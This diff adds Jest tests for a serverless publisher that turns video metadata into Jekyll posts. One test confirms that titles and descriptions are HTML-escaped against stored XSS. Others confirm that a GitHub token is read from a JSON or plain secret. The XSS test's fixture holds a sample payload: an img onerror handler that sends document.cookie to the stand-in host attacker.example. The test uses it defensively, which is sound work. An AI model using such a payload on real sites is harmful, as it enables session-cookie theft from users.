@@ -248,6 +248,31 @@ describe('Publisher Lambda - generateJekyllPost', () => {
     const post = generateJekyllPost(metaWithQuotes, hlsUrl, captionPath);
     expect(post).toContain('title: "Event \\"Special\\" Edition"');
   });
+
+  it('HTML-escapes title and description in the body to prevent stored XSS (issue #87)', () => {
+    const malicious = {
+      ...metadata,
+      title: '<script>alert("xss")</script>',
+      description: '<img src=x onerror=fetch("https://attacker.example/?c="+document.cookie)>',
+    };
+    const post = generateJekyllPost(malicious, hlsUrl, captionPath);
+
+    // Slice to just the body so we don't false-positive on the platform's
+    // own <script>/<video> tags in the rendered HLS player block.
+    const bodyStart = post.indexOf('\n---\n') + 5;
+    const body = post.slice(bodyStart);
+
+    // The escaped forms ARE present (the angle brackets are now entities,
+    // so a browser will render the text literally rather than execute it).
+    expect(body).toContain('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
+    expect(body).toContain('&lt;img src=x onerror=fetch(&quot;');
+
+    // Anything in the body that looks like a real <script> tag must be one
+    // of the platform's own (HLS.js loader, player init) — never derived
+    // from user title/description. The opening `<script` doesn't appear
+    // adjacent to attacker's `alert("xss")` payload anywhere.
+    expect(body).not.toMatch(/<script[^>]*>alert\("xss"\)/);
+  });
 });
 
 describe('Publisher Lambda - escapeYaml', () => {
@@ -511,5 +536,61 @@ describe('Publisher Lambda - handler integration', () => {
     expect(result.statusCode).toBe(200);
     const body = JSON.parse(result.body);
     expect(body.message).toBe('Published successfully');
+  });
+});
+
+// Issue #117: CDK provisions the GitHub token secret as a JSON template
+// — `{ "token": "...", "placeholder": "..." }`. The previous implementation
+// returned the whole JSON string as the auth token, producing
+// `Authorization: token {"token":"...",...}` and a 401 from GitHub.
+describe('Publisher Lambda - getGitHubToken (#117)', () => {
+  beforeEach(() => {
+    jest.clearAllMocks();
+  });
+
+  it('extracts the `token` field when SecretString is a JSON object', async () => {
+    secretsModule.__mockSend.mockResolvedValueOnce({
+      SecretString: JSON.stringify({ token: 'ghp_abc123', placeholder: 'noise' }),
+    });
+
+    const token = await _internals.getGitHubToken();
+    expect(token).toBe('ghp_abc123');
+  });
+
+  it('returns the value as-is when SecretString is a plain token string', async () => {
+    // Operators who overwrite the secret in the console with a plain
+    // string (no JSON wrapper) must keep working.
+    secretsModule.__mockSend.mockResolvedValueOnce({
+      SecretString: 'ghp_plain_token_value',
+    });
+
+    const token = await _internals.getGitHubToken();
+    expect(token).toBe('ghp_plain_token_value');
+  });
+
+  it('falls back to raw string when JSON parses but has no `token` field', async () => {
+    secretsModule.__mockSend.mockResolvedValueOnce({
+      SecretString: JSON.stringify({ placeholder: 'noise', other: 'fields' }),
+    });
+
+    const token = await _internals.getGitHubToken();
+    // The raw JSON gets returned verbatim — better than throwing because
+    // an operator may have stored an unusual format. Authentication will
+    // fail downstream, which is the right signal.
+    expect(token).toBe('{"placeholder":"noise","other":"fields"}');
+  });
+
+  it('throws when SecretString is empty', async () => {
+    secretsModule.__mockSend.mockResolvedValueOnce({
+      SecretString: '',
+    });
+
+    await expect(_internals.getGitHubToken()).rejects.toThrow(/missing or empty/);
+  });
+
+  it('throws when SecretString is missing/undefined', async () => {
+    secretsModule.__mockSend.mockResolvedValueOnce({});
+
+    await expect(_internals.getGitHubToken()).rejects.toThrow(/missing or empty/);
   });
 });
